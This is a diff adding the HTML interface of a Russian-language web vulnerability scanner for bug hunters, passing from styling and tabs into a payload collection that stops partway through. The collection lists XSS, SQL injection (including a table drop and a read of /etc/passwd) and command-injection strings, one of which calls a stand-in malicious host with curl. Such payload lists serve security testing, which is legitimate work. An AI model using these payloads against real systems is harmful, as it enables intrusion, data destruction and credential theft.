@@ -1,0 +1,1916 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BLOODSEC Scanner - Швейцарский нож для багхантера</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        @keyframes bloodPulse {
+            0% { box-shadow: 0 0 10px rgba(180, 8, 8, 0.5); }
+            50% { box-shadow: 0 0 25px rgba(180, 8, 8, 0.8); }
+            100% { box-shadow: 0 0 10px rgba(180, 8, 8, 0.5); }
+        }
+        
+        @keyframes bloodDrip {
+            0% { background-position: 0 0; }
+            100% { background-position: 0 100px; }
+        }
+        
+        :root {
+            --blood-dark: #1a0000;
+            --blood-primary: #4a0000;
+            --blood-accent: #b00808;
+            --blood-light: #ff4d4d;
+        }
+        
+        body {
+            background: 
+                radial-gradient(circle at 10% 20%, var(--blood-dark) 0%, #000 100%),
+                url("data:image/svg+xml,%3Csvg width='100' height='100' viewBox='0 0 100 100' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M11 18c3.866 0 7-3.134 7-7s-3.134-7-7-7-7 3.134-7 7 3.134 7 7 7zm48 25c3.866 0 7-3.134 7-7s-3.134-7-7-7-7 3.134-7 7 3.134 7 7 7zm-43-7c1.657 0 3-1.343 3-3s-1.343-3-3-3-3 1.343-3 3 1.343 3 3 3zm63 31c1.657 0 3-1.343 3-3s-1.343-3-3-3-3 1.343-3 3 1.343 3 3 3zM34 90c1.657 0 3-1.343 3-3s-1.343-3-3-3-3 1.343-3 3 1.343 3 3 3zm56-76c1.657 0 3-1.343 3-3s-1.343-3-3-3-3 1.343-3 3 1.343 3 3 3zM12 86c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm28-65c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm23-11c2.76 0 5-2.24 5-5s-2.24-5-5-5-5 2.24-5 5 2.24 5 5 5zm-6 60c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm29 22c2.76 0 5-2.24 5-5s-2.24-5-5-5-5 2.24-5 5 2.24 5 5 5zM32 63c2.76 0 5-2.24 5-5s-2.24-5-5-5-5 2.24-5 5 2.24 5 5 5zm57-13c2.76 0 5-2.24 5-5s-2.24-5-5-5-5 2.24-5 5 2.24 5 5 5zm-9-21c1.105 0 2-.895 2-2s-.895-2-2-2-2 .895-2 2 .895 2 2 2zM60 91c1.105 0 2-.895 2-2s-.895-2-2-2-2 .895-2 2 .895 2 2 2zM35 41c1.105 0 2-.895 2-2s-.895-2-2-2-2 .895-2 2 .895 2 2 2zM12 60c1.105 0 2-.895 2-2s-.895-2-2-2-2 .895-2 2 .895 2 2 2z' fill='%23b00808' fill-opacity='0.05' fill-rule='evenodd'/%3E%3C/svg%3E");
+            color: #ffeaea;
+            font-family: 'Courier New', monospace;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+        
+        .blood-header {
+            background: 
+                linear-gradient(135deg, var(--blood-primary) 0%, var(--blood-dark) 100%),
+                url("data:image/svg+xml,%3Csvg width='100' height='100' viewBox='0 0 100 100' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M11 18c3.866 0 7-3.134 7-7s-3.134-7-7-7-7 3.134-7 7 3.134 7 7 7zm48 25c3.866 0 7-3.134 7-7s-3.134-7-7-7-7 3.134-7 7 3.134 7 7 7zm-43-7c1.657 0 3-1.343 3-3s-1.343-3-3-3-3 1.343-3 3 1.343 3 3 3zm63 31c1.657 0 3-1.343 3-3s-1.343-3-3-3-3 1.343-3 3 1.343 3 3 3zM34 90c1.657 0 3-1.343 3-3s-1.343-3-3-3-3 1.343-3 3 1.343 3 3 3zm56-76c1.657 0 3-1.343 3-3s-1.343-3-3-3-3 1.343-3 3 1.343 3 3 3zM12 86c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm28-65c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm23-11c2.76 0 5-2.24 5-5s-2.24-5-5-5-5 2.24-5 5 2.24 5 5 5zm-6 60c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm29 22c2.76 0 5-2.24 5-5s-2.24-5-5-5-5 2.24-5 5 2.24 5 5 5zM32 63c2.76 0 5-2.24 5-5s-2.24-5-5-5-5 2.24-5 5 2.24 5 5 5zm57-13c2.76 0 5-2.24 5-5s-2.24-5-5-5-5 2.24-5 5 2.24 5 5 5zm-9-21c1.105 0 2-.895 2-2s-.895-2-2-2-2 .895-2 2 .895 2 2 2zM60 91c1.105 0 2-.895 2-2s-.895-2-2-2-2 .895-2 2 .895 2 2 2zM35 41c1.105 0 2-.895 2-2s-.895-2-2-2-2 .895-2 2 .895 2 2 2zM12 60c1.105 0 2-.895 2-2s-.895-2-2-2-2 .895-2 2 .895 2 2 2z' fill='%23b00808' fill-opacity='0.1' fill-rule='evenodd'/%3E%3C/svg%3E");
+            box-shadow: 0 4px 20px rgba(180, 8, 8, 0.6);
+            border-bottom: 2px solid var(--blood-light);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .blood-header::after {
+            content: "";
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            height: 10px;
+            background: linear-gradient(90deg, transparent, var(--blood-light), transparent);
+            animation: bloodFlow 3s infinite linear;
+        }
+        
+        @keyframes bloodFlow {
+            0% { background-position: -100% 0; }
+            100% { background-position: 100% 0; }
+        }
+        
+        .blood-card {
+            background: rgba(26, 0, 0, 0.8);
+            border: 1px solid #4a0000;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(180, 8, 8, 0.3);
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .blood-card::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: var(--blood-accent);
+            transform: translateY(-100%);
+            transition: transform 0.3s ease;
+        }
+        
+        .blood-card:hover::before {
+            transform: translateY(0);
+        }
+        
+        .blood-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 25px rgba(180, 8, 8, 0.5);
+        }
+        
+        .btn-blood {
+            background: linear-gradient(to right, var(--blood-accent), #8a0606);
+            color: #fff;
+            border: none;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            font-weight: 600;
+            position: relative;
+            overflow: hidden;
+            border: 1px solid rgba(180, 8, 8, 0.3);
+        }
+        
+        .btn-blood:hover {
+            background: linear-gradient(to right, #8a0606, var(--blood-accent));
+            transform: translateY(-2px);
+            box-shadow: 0 4px 15px rgba(180, 8, 8, 0.4);
+        }
+        
+        .btn-blood::after {
+            content: "";
+            position: absolute;
+            top: -50%;
+            left: -60%;
+            width: 20px;
+            height: 200%;
+            background: rgba(255,255,255,0.3);
+            transform: rotate(30deg);
+            transition: all 0.6s ease;
+        }
+        
+        .btn-blood:hover::after {
+            left: 120%;
+        }
+        
+        .btn-dark {
+            background: linear-gradient(to right, #2a0a0a, #1a0000);
+            color: #ffeaea;
+            border: 1px solid #4a0000;
+        }
+        
+        .btn-dark:hover {
+            background: linear-gradient(to right, #1a0000, #2a0a0a);
+        }
+        
+        .result-critical { 
+            background-color: rgba(180, 8, 8, 0.2); 
+            border-left: 4px solid var(--blood-accent);
+            animation: bloodPulse 2s infinite;
+        }
+        
+        .result-warning { 
+            background-color: rgba(180, 8, 8, 0.15); 
+            border-left: 4px solid #d9534f;
+        }
+        
+        .result-success { 
+            background-color: rgba(40, 167, 69, 0.15); 
+            border-left: 4px solid #28a745;
+        }
+        
+        .result-info { 
+            background-color: rgba(23, 162, 184, 0.15); 
+            border-left: 4px solid #17a2b8;
+        }
+        
+        .result-high { 
+            background-color: rgba(217, 83, 79, 0.15); 
+            border-left: 4px solid #d9534f;
+        }
+        
+        .result-medium { 
+            background-color: rgba(240, 173, 78, 0.15); 
+            border-left: 4px solid #f0ad4e;
+        }
+        
+        .result-low { 
+            background-color: rgba(91, 192, 222, 0.15); 
+            border-left: 4px solid #5bc0de;
+        }
+        
+        .target-frame {
+            border: 2px solid #4a0000;
+            border-radius: 8px;
+            background: white;
+        }
+        
+        .results-container {
+            max-height: 500px;
+            overflow-y: auto;
+            scrollbar-width: thin;
+            scrollbar-color: var(--blood-accent) #1a0000;
+        }
+        
+        .results-container::-webkit-scrollbar {
+            width: 10px;
+        }
+        
+        .results-container::-webkit-scrollbar-track {
+            background: #1a0000;
+            border-radius: 4px;
+        }
+        
+        .results-container::-webkit-scrollbar-thumb {
+            background: var(--blood-accent);
+            border-radius: 4px;
+        }
+        
+        .progress-bar {
+            height: 6px;
+            background: var(--blood-accent);
+            width: 0%;
+            transition: width 0.4s ease;
+            border-radius: 3px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .progress-bar::after {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+            animation: progressGlow 2s infinite linear;
+        }
+        
+        @keyframes progressGlow {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+        
+        .test-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 20px;
+        }
+        
+        .status-badge {
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 14px;
+            font-weight: 600;
+            background: rgba(74, 0, 0, 0.7);
+            border: 1px solid var(--blood-accent);
+        }
+        
+        .tab-buttons {
+            display: flex;
+            gap: 5px;
+            margin-bottom: 15px;
+            border-bottom: 2px solid #4a0000;
+        }
+        
+        .tab-btn {
+            padding: 10px 20px;
+            background: rgba(26, 0, 0, 0.7);
+            border: none;
+            border-top-left-radius: 8px;
+            border-top-right-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .tab-btn.active {
+            background: var(--blood-accent);
+            font-weight: bold;
+        }
+        
+        .tab-content {
+            display: none;
+        }
+        
+        .tab-content.active {
+            display: block;
+        }
+        
+        .vulnerability-badge {
+            display: inline-block;
+            padding: 3px 10px;
+            border-radius: 12px;
+            font-size: 12px;
+            font-weight: bold;
+            margin: 0 5px;
+        }
+        
+        .critical-badge {
+            background: var(--blood-accent);
+        }
+        
+        .high-badge {
+            background: #d9534f;
+        }
+        
+        .medium-badge {
+            background: #f0ad4e;
+        }
+        
+        .low-badge {
+            background: #5bc0de;
+        }
+        
+        .severity-meter {
+            height: 10px;
+            background: linear-gradient(90deg, #28a745, #f0ad4e, #d9534f, var(--blood-accent));
+            border-radius: 5px;
+            margin: 10px 0;
+            position: relative;
+        }
+        
+        .severity-indicator {
+            position: absolute;
+            top: -5px;
+            width: 4px;
+            height: 20px;
+            background: white;
+            transform: translateX(-50%);
+        }
+        
+        .blood-drop {
+            position: absolute;
+            width: 20px;
+            height: 20px;
+            background: var(--blood-accent);
+            border-radius: 50% 50% 50% 0;
+            transform: rotate(-45deg);
+            opacity: 0;
+            pointer-events: none;
+            z-index: 100;
+        }
+        
+        .blood-animation {
+            animation: bloodDrop 1s forwards;
+        }
+        
+        @keyframes bloodDrop {
+            0% { transform: translateY(-100px) rotate(-45deg); opacity: 1; }
+            70% { opacity: 1; }
+            100% { transform: translateY(100px) rotate(-45deg); opacity: 0; }
+        }
+        
+        .result-item {
+            position: relative;
+            transition: all 0.3s ease;
+        }
+        
+        .result-item:hover {
+            transform: scale(1.01);
+            box-shadow: 0 5px 15px rgba(180, 8, 8, 0.3);
+        }
+        
+        .export-btn {
+            background: linear-gradient(to right, #2a0a0a, #1a0000);
+            border: 1px solid #4a0000;
+            color: #ffeaea;
+            padding: 8px 15px;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        
+        .export-btn:hover {
+            background: linear-gradient(to right, #1a0000, #2a0a0a);
+            border-color: var(--blood-accent);
+        }
+        
+        .modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: rgba(0,0,0,0.8);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+        }
+        
+        .modal-content {
+            background-color: #1a0000;
+            border: 1px solid var(--blood-accent);
+            border-radius: 8px;
+            max-width: 90%;
+            max-height: 90%;
+            overflow: auto;
+            padding: 20px;
+            width: 800px;
+        }
+        
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        
+        .modal-close {
+            background: none;
+            border: none;
+            color: var(--blood-light);
+            font-size: 1.5rem;
+            cursor: pointer;
+        }
+        
+        pre {
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            background-color: rgba(0,0,0,0.5);
+            padding: 15px;
+            border-radius: 5px;
+            max-height: 500px;
+            overflow: auto;
+        }
+    </style>
+</head>
+<body>
+    <div class="container mx-auto p-4 md:p-6">
+        <!-- Header -->
+        <header class="blood-header p-6 mb-6 rounded-xl">
+            <div class="flex flex-col md:flex-row md:items-center justify-between gap-4">
+                <div>
+                    <h1 class="text-2xl md:text-3xl font-bold text-white flex items-center gap-3">
+                        <i class="fas fa-tint"></i> BLOODSEC Scanner
+                    </h1>
+                    <p class="text-sm text-red-200 mt-2">Продвинутый инструмент для поиска уязвимостей</p>
+                </div>
+                
+                <div class="flex items-center gap-3">
+                    <div class="status-badge text-red-300">
+                        <i class="fas fa-circle mr-1 text-xs"></i> <span id="status">Готов</span>
+                    </div>
+                    <div class="status-badge text-red-200">
+                        <i class="fas fa-vial mr-1"></i> <span id="testsCounter">0</span>
+                    </div>
+                    <div class="status-badge text-red-200">
+                        <i class="fas fa-bug mr-1"></i> <span id="vulnCounter">0</span>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="mt-6 flex flex-col md:flex-row gap-4">
+                <input id="targetInput" type="text" value="https://example.com" 
+                    class="flex-grow p-3 bg-red-900 bg-opacity-50 border border-red-700 rounded-lg text-white focus:outline-none focus:ring-2 focus:ring-red-500 focus:border-red-500" 
+                    placeholder="Введите URL цели">
+                <button id="scanUrl" class="btn-blood p-3 rounded-lg flex items-center justify-center">
+                    <i class="fas fa-bolt"></i> Сканировать
+                </button>
+            </div>
+            
+            <div class="progress-bar mt-4" id="globalProgress"></div>
+        </header>
+
+        <!-- Tabs -->
+        <div class="tab-buttons mb-6">
+            <button class="tab-btn active" data-tab="scanner">Сканер</button>
+            <button class="tab-btn" data-tab="utilities">Утилиты</button>
+            <button class="tab-btn" data-tab="reports">Отчеты</button>
+            <button class="tab-btn" data-tab="payloads">Пейлоады</button>
+        </div>
+
+        <!-- Scanner Tab -->
+        <div class="tab-content active" id="scannerTab">
+            <div class="test-grid mb-8">
+                <!-- Быстрые действия -->
+                <section class="blood-card p-5">
+                    <h2 class="text-xl font-semibold mb-4 text-white flex items-center gap-2 border-b border-red-800 pb-3">
+                        <i class="fas fa-bolt text-red-400"></i> Быстрые действия
+                    </h2>
+                    <div class="space-y-3">
+                        <button id="runAllTests" class="btn-blood w-full p-3 rounded-lg">
+                            <i class="fas fa-play-circle"></i> Запустить все тесты
+                        </button>
+                        <button id="viewSource" class="btn-blood w-full p-3 rounded-lg">
+                            <i class="fas fa-code"></i> Просмотр исходного кода
+                        </button>
+                        <button id="wafTest" class="btn-blood w-full p-3 rounded-lg">
+                            <i class="fas fa-shield-virus"></i> Проверка WAF
+                        </button>
+                        <button id="headerTest" class="btn-blood w-full p-3 rounded-lg">
+                            <i class="fas fa-heading"></i> Проверка заголовков
+                        </button>
+                        <button id="csrfTest" class="btn-blood w-full p-3 rounded-lg">
+                            <i class="fas fa-link"></i> CSRF Проверка
+                        </button>
+                    </div>
+                </section>
+
+                <!-- Основные тесты -->
+                <section class="blood-card p-5">
+                    <h2 class="text-xl font-semibold mb-4 text-white flex items-center gap-2 border-b border-red-800 pb-3">
+                        <i class="fas fa-star text-red-400"></i> Основные тесты
+                    </h2>
+                    <div class="space-y-3">
+                        <button id="xssTest" class="btn-blood w-full p-3 rounded-lg">
+                            <i class="fas fa-bug"></i> XSS
+                        </button>
+                        <button id="sqliTest" class="btn-blood w-full p-3 rounded-lg">
+                            <i class="fas fa-database"></i> SQL Injection
+                        </button>
+                        <button id="lfiTest" class="btn-blood w-full p-3 rounded-lg">
+                            <i class="fas fa-file"></i> LFI/RFI
+                        </button>
+                        <button id="idorTest" class="btn-blood w-full p-3 rounded-lg">
+                            <i class="fas fa-id-card"></i> IDOR
+                        </button>
+                    </div>
+                </section>
+
+                <!-- Дополнительные тесты -->
+                <section class="blood-card p-5">
+                    <h2 class="text-xl font-semibold mb-4 text-white flex items-center gap-2 border-b border-red-800 pb-3">
+                        <i class="fas fa-cog text-red-400"></i> Дополнительные тесты
+                    </h2>
+                    <div class="space-y-3">
+                        <button id="ssrfTest" class="btn-blood w-full p-3 rounded-lg">
+                            <i class="fas fa-server"></i> SSRF
+                        </button>
+                        <button id="xxeTest" class="btn-blood w-full p-3 rounded-lg">
+                            <i class="fas fa-file-code"></i> XXE
+                        </button>
+                        <button id="rceTest" class="btn-blood w-full p-3 rounded-lg">
+                            <i class="fas fa-terminal"></i> RCE
+                        </button>
+                        <button id="corsTest" class="btn-blood w-full p-3 rounded-lg">
+                            <i class="fas fa-unlock-alt"></i> CORS
+                        </button>
+                    </div>
+                </section>
+            </div>
+
+            <!-- Results Section -->
+            <div class="blood-card p-6 rounded-lg">
+                <div class="flex flex-col md:flex-row md:items-center justify-between mb-4 gap-3">
+                    <h2 class="text-xl font-semibold text-white flex items-center gap-2">
+                        <i class="fas fa-clipboard-list text-red-400"></i> Результаты тестирования
+                    </h2>
+                    <div class="flex gap-2">
+                        <button id="clearResultsBtn" class="btn-dark p-3 rounded-lg flex items-center">
+                            <i class="fas fa-trash mr-2"></i> Очистить
+                        </button>
+                        <button id="stopTestsBtn" class="btn-dark p-3 rounded-lg flex items-center">
+                            <i class="fas fa-stop mr-2"></i> Стоп
+                        </button>
+                    </div>
+                </div>
+                <div id="results" class="results-container space-y-3 pr-2"></div>
+            </div>
+        </div>
+
+        <!-- Utilities Tab -->
+        <div class="tab-content" id="utilitiesTab">
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                <div class="blood-card p-5">
+                    <h2 class="text-xl font-semibold mb-4 text-white flex items-center gap-2 border-b border-red-800 pb-3">
+                        <i class="fas fa-lock text-red-400"></i> Кодирование
+                    </h2>
+                    <div class="space-y-3">
+                        <div>
+                            <textarea id="utilityInput" class="w-full p-3 bg-red-900 bg-opacity-30 text-white rounded-lg mb-2" 
+                                rows="4" placeholder="Введите текст для обработки"></textarea>
+                            <div class="grid grid-cols-2 gap-2">
+                                <button id="encodeBase64" class="btn-dark p-2 rounded-lg">
+                                    <i class="fas fa-lock"></i> Base64 Encode
+                                </button>
+                                <button id="decodeBase64" class="btn-dark p-2 rounded-lg">
+                                    <i class="fas fa-lock-open"></i> Base64 Decode
+                                </button>
+                                <button id="encodeURL" class="btn-dark p-2 rounded-lg">
+                                    <i class="fas fa-link"></i> URL Encode
+                                </button>
+                                <button id="decodeURL" class="btn-dark p-2 rounded-lg">
+                                    <i class="fas fa-unlink"></i> URL Decode
+                                </button>
+                                <button id="encodeHTML" class="btn-dark p-2 rounded-lg">
+                                    <i class="fas fa-code"></i> HTML Encode
+                                </button>
+                                <button id="decodeHTML" class="btn-dark p-2 rounded-lg">
+                                    <i class="fas fa-code"></i> HTML Decode
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="blood-card p-5">
+                    <h2 class="text-xl font-semibold mb-4 text-white flex items-center gap-2 border-b border-red-800 pb-3">
+                        <i class="fas fa-hashtag text-red-400"></i> Хеширование
+                    </h2>
+                    <div class="space-y-3">
+                        <div>
+                            <textarea id="hashInput" class="w-full p-3 bg-red-900 bg-opacity-30 text-white rounded-lg mb-2" 
+                                rows="2" placeholder="Введите текст для хеширования"></textarea>
+                            <div class="grid grid-cols-3 gap-2">
+                                <button id="generateMD5" class="btn-dark p-2 rounded-lg">
+                                    MD5
+                                </button>
+                                <button id="generateSHA1" class="btn-dark p-2 rounded-lg">
+                                    SHA-1
+                                </button>
+                                <button id="generateSHA256" class="btn-dark p-2 rounded-lg">
+                                    SHA-256
+                                </button>
+                            </div>
+                            <textarea id="hashOutput" class="w-full p-3 bg-red-900 bg-opacity-30 text-white rounded-lg mt-2" 
+                                rows="2" readonly placeholder="Результат хеширования"></textarea>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="blood-card p-5">
+                    <h2 class="text-xl font-semibold mb-4 text-white flex items-center gap-2 border-b border-red-800 pb-3">
+                        <i class="fas fa-key text-red-400"></i> JWT Decoder
+                    </h2>
+                    <div class="space-y-3">
+                        <textarea id="jwtInput" class="w-full p-3 bg-red-900 bg-opacity-30 text-white rounded-lg mb-2" 
+                            rows="2" placeholder="Введите JWT токен"></textarea>
+                        <button id="decodeJWT" class="btn-dark w-full p-2 rounded-lg">
+                            <i class="fas fa-unlock"></i> Декодировать JWT
+                        </button>
+                        <pre id="jwtOutput" class="w-full p-3 bg-red-900 bg-opacity-30 text-white rounded-lg mt-2" 
+                            style="min-height: 100px;" readonly placeholder="Результат декодирования"></pre>
+                    </div>
+                </div>
+                
+                <div class="blood-card p-5">
+                    <h2 class="text-xl font-semibold mb-4 text-white flex items-center gap-2 border-b border-red-800 pb-3">
+                        <i class="fas fa-network-wired text-red-400"></i> Сетевые инструменты
+                    </h2>
+                    <div class="space-y-3">
+                        <input id="networkInput" type="text" class="w-full p-2 bg-red-900 bg-opacity-30 text-white rounded-lg" 
+                            placeholder="Введите домен/IP">
+                        <div class="grid grid-cols-2 gap-2">
+                            <button id="dnsLookup" class="btn-dark p-2 rounded-lg">
+                                <i class="fas fa-globe"></i> DNS Lookup
+                            </button>
+                            <button id="whoisLookup" class="btn-dark p-2 rounded-lg">
+                                <i class="fas fa-info-circle"></i> WHOIS
+                            </button>
+                            <button id="subdomainTest" class="btn-dark p-2 rounded-lg">
+                                <i class="fas fa-sitemap"></i> Субдомены
+                            </button>
+                            <button id="portScanner" class="btn-dark p-2 rounded-lg">
+                                <i class="fas fa-plug"></i> Порты
+                            </button>
+                        </div>
+                        <pre id="networkOutput" class="w-full p-3 bg-red-900 bg-opacity-30 text-white rounded-lg mt-2" 
+                            style="min-height: 100px;" readonly placeholder="Результат"></pre>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Reports Tab -->
+        <div class="tab-content" id="reportsTab">
+            <div class="blood-card p-5 mb-6">
+                <h2 class="text-xl font-semibold mb-4 text-white flex items-center gap-2 border-b border-red-800 pb-3">
+                    <i class="fas fa-file-alt text-red-400"></i> Сгенерированные отчеты
+                </h2>
+                <div id="reportsList" class="space-y-3">
+                    <p class="text-red-200">Отчеты будут отображаться здесь после сканирования</p>
+                </div>
+            </div>
+            
+            <div class="blood-card p-5">
+                <h2 class="text-xl font-semibold mb-4 text-white flex items-center gap-2 border-b border-red-800 pb-3">
+                    <i class="fas fa-chart-pie text-red-400"></i> Статистика уязвимостей
+                </h2>
+                <div id="vulnerabilityStats" class="space-y-3">
+                    <div class="flex items-center justify-between">
+                        <span>Критические</span>
+                        <span id="criticalCount">0</span>
+                    </div>
+                    <div class="severity-meter">
+                        <div class="severity-indicator" style="left: 0%;"></div>
+                    </div>
+                    
+                    <div class="flex items-center justify-between">
+                        <span>Высокие</span>
+                        <span id="highCount">0</span>
+                    </div>
+                    <div class="severity-meter">
+                        <div class="severity-indicator" style="left: 33%;"></div>
+                    </div>
+                    
+                    <div class="flex items-center justify-between">
+                        <span>Средние</span>
+                        <span id="mediumCount">0</span>
+                    </div>
+                    <div class="severity-meter">
+                        <div class="severity-indicator" style="left: 66%;"></div>
+                    </div>
+                    
+                    <div class="flex items-center justify-between">
+                        <span>Низкие</span>
+                        <span id="lowCount">0</span>
+                    </div>
+                    <div class="severity-meter">
+                        <div class="severity-indicator" style="left: 100%;"></div>
+                    </div>
+                    
+                    <div class="mt-4 flex gap-2">
+                        <button id="exportPDF" class="export-btn">
+                            <i class="fas fa-file-pdf"></i> PDF
+                        </button>
+                        <button id="exportCSV" class="export-btn">
+                            <i class="fas fa-file-csv"></i> CSV
+                        </button>
+                        <button id="exportHTML" class="export-btn">
+                            <i class="fas fa-code"></i> HTML
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Payloads Tab -->
+        <div class="tab-content" id="payloadsTab">
+            <div class="blood-card p-5 mb-6">
+                <h2 class="text-xl font-semibold mb-4 text-white flex items-center gap-2 border-b border-red-800 pb-3">
+                    <i class="fas fa-code text-red-400"></i> Генератор пейлоадов
+                </h2>
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
+                    <div>
+                        <label class="block mb-2 text-red-200">Тип пейлоада</label>
+                        <select id="payloadType" class="w-full p-3 bg-red-900 bg-opacity-30 text-white rounded-lg focus:outline-none focus:ring-2 focus:ring-red-500 focus:border-red-500">
+                            <option value="xss">XSS</option>
+                            <option value="sql">SQL Injection</option>
+                            <option value="command">Command Injection</option>
+                            <option value="ssti">SSTI</option>
+                            <option value="xxe">XXE</option>
+                            <option value="lfi">LFI/RFI</option>
+                        </select>
+                    </div>
+                    
+                    <div>
+                        <label class="block mb-2 text-red-200">Кодирование</label>
+                        <select id="payloadEncoding" class="w-full p-3 bg-red-900 bg-opacity-30 text-white rounded-lg focus:outline-none focus:ring-2 focus:ring-red-500 focus:border-red-500">
+                            <option value="none">Нет</option>
+                            <option value="url">URL</option>
+                            <option value="base64">Base64</option>
+                            <option value="html">HTML</option>
+                            <option value="js">JavaScript</option>
+                        </select>
+                    </div>
+                </div>
+                
+                <textarea id="generatedPayload" class="w-full p-3 bg-red-900 bg-opacity-30 text-white rounded-lg mb-4" 
+                    rows="6" readonly placeholder="Сгенерированный пейлоад"></textarea>
+                
+                <button id="copyPayload" class="btn-blood w-full p-3 rounded-lg flex items-center justify-center">
+                    <i class="fas fa-copy mr-2"></i> Копировать пейлоад
+                </button>
+            </div>
+            
+            <div class="blood-card p-5">
+                <h2 class="text-xl font-semibold mb-4 text-white flex items-center gap-2 border-b border-red-800 pb-3">
+                    <i class="fas fa-bomb text-red-400"></i> Коллекция пейлоадов
+                </h2>
+                <div id="payloadCollection" class="space-y-4">
+                    <div>
+                        <h3 class="font-bold text-red-300 mb-2">XSS Payloads</h3>
+                        <div class="grid grid-cols-1 md:grid-cols-2 gap-2">
+                            <div class="bg-red-900 bg-opacity-30 p-2 rounded text-sm">&lt;script&gt;alert(1)&lt;/script&gt;</div>
+                            <div class="bg-red-900 bg-opacity-30 p-2 rounded text-sm">javascript:alert(document.cookie)</div>
+                            <div class="bg-red-900 bg-opacity-30 p-2 rounded text-sm">&lt;img src=x onerror=alert(1)&gt;</div>
+                            <div class="bg-red-900 bg-opacity-30 p-2 rounded text-sm">&lt;svg onload=alert(1)&gt;</div>
+                            <div class="bg-red-900 bg-opacity-30 p-2 rounded text-sm">&lt;body onload=alert(1)&gt;</div>
+                            <div class="bg-red-900 bg-opacity-30 p-2 rounded text-sm">&lt;iframe src="javascript:alert(1)"&gt;</div>
+                            <div class="bg-red-900 bg-opacity-30 p-2 rounded text-sm">&lt;a href="javascript:alert(1)"&gt;click&lt;/a&gt;</div>
+                            <div class="bg-red-900 bg-opacity-30 p-2 rounded text-sm">&lt;details/open/ontoggle=alert(1)&gt;</div>
+                        </div>
+                    </div>
+                    
+                    <div>
+                        <h3 class="font-bold text-red-300 mb-2">SQL Injection</h3>
+                        <div class="grid grid-cols-1 md:grid-cols-2 gap-2">
+                            <div class="bg-red-900 bg-opacity-30 p-2 rounded text-sm">' OR 1=1--</div>
+                            <div class="bg-red-900 bg-opacity-30 p-2 rounded text-sm">' UNION SELECT null,version()--</div>
+                            <div class="bg-red-900 bg-opacity-30 p-2 rounded text-sm">' AND SLEEP(5)--</div>
+                            <div class="bg-red-900 bg-opacity-30 p-2 rounded text-sm">' OR EXISTS(SELECT * FROM users)--</div>
+                            <div class="bg-red-900 bg-opacity-30 p-2 rounded text-sm">' UNION SELECT table_name FROM information_schema.tables--</div>
+                            <div class="bg-red-900 bg-opacity-30 p-2 rounded text-sm">'; DROP TABLE users--</div>
+                            <div class="bg-red-900 bg-opacity-30 p-2 rounded text-sm">' OR 'a'='a</div>
+                            <div class="bg-red-900 bg-opacity-30 p-2 rounded text-sm">' UNION SELECT 1,LOAD_FILE('/etc/passwd')--</div>
+                        </div>
+                    </div>
+                    
+                    <div>
+                        <h3 class="font-bold text-red-300 mb-2">Command Injection</h3>
+                        <div class="grid grid-cols-1 md:grid-cols-2 gap-2">
+                            <div class="bg-red-900 bg-opacity-30 p-2 rounded text-sm">; ls -la</div>
+                            <div class="bg-red-900 bg-opacity-30 p-2 rounded text-sm">| cat /etc/passwd</div>
+                            <div class="bg-red-900 bg-opacity-30 p-2 rounded text-sm">`id`</div>
+                            <div class="bg-red-900 bg-opacity-30 p-2 rounded text-sm">$(whoami)</div>
+                            <div class="bg-red-900 bg-opacity-30 p-2 rounded text-sm">; ping -c 1 localhost</div>
+                            <div class="bg-red-900 bg-opacity-30 p-2 rounded text-sm">| nc 127.0.0.1 22</div>
+                            <div class="bg-red-900 bg-opacity-30 p-2 rounded text-sm">`curl http://malicious.com`</div>
